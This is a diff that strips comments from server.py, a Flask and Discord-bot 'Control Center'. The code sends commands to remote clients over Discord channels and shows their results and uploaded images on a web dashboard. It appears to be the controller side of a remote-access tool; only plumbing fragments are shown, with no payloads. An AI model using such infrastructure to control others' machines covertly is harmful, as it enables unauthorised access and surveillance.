@@ -1,4 +1,3 @@
-# server.py - Control Center (UPDATED with all commands)
 import os
 import sys
 import json
@@ -18,9 +17,6 @@ import psutil
 import requests
 from io import BytesIO
 
-# ============================================
-# CONFIGURATION
-# ============================================
 DISCORD_TOKEN = "tokenhere"
 CLIENTS_FILE = "clients.json"
 VERSION = "1.0.0"
@@ -31,7 +27,6 @@ app.config['SECRET_KEY'] = 'your-secret-key-here'
 CORS(app)
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
 
-# Global variables
 clients = {}
 bot = None
 client_channels = {}
@@ -167,7 +162,6 @@ class ControlBot(commands.Bot):
             socketio.emit('client_update', {'client_id': client_id, 'status': 'online'})
             return
         
-        # Handle image attachments
         if message.attachments:
             for attachment in message.attachments:
                 if attachment.filename.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
@@ -189,7 +183,6 @@ class ControlBot(commands.Bot):
                     })
                     print(f"   ✅ Image broadcast to web: {attachment.filename}")
         
-        # Handle command results
         if message.content and message.content.startswith("RESULT:"):
             try:
                 _, cid, result = message.content.split(":", 2)
@@ -212,7 +205,6 @@ class ControlBot(commands.Bot):
                 print(f"Error handling result: {e}")
             return
         
-        # Handle errors
         if message.content and message.content.startswith("ERROR:"):
             try:
                 _, cid, error = message.content.split(":", 2)
@@ -257,7 +249,6 @@ class ControlBot(commands.Bot):
             print(f"Error sending command: {e}")
             return False
 
-# Flask routes
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -351,7 +342,6 @@ def get_quick_commands():
     ]
     return jsonify(commands)
 
-# SocketIO events
 @socketio.on('connect')
 def handle_connect():
     print('🌐 Web client connected')
@@ -366,7 +356,6 @@ def handle_disconnect():
 def handle_get_clients():
     emit('clients_update', {'clients': clients})
 
-# Initialize bot
 def run_bot():
     global bot
     bot = ControlBot()
@@ -378,7 +367,6 @@ def run_bot():
     except Exception as e:
         print(f"Bot error: {e}")
 
-# Main
 if __name__ == '__main__':
     print("""
 ╔═══════════════════════════════════════════════════════════╗
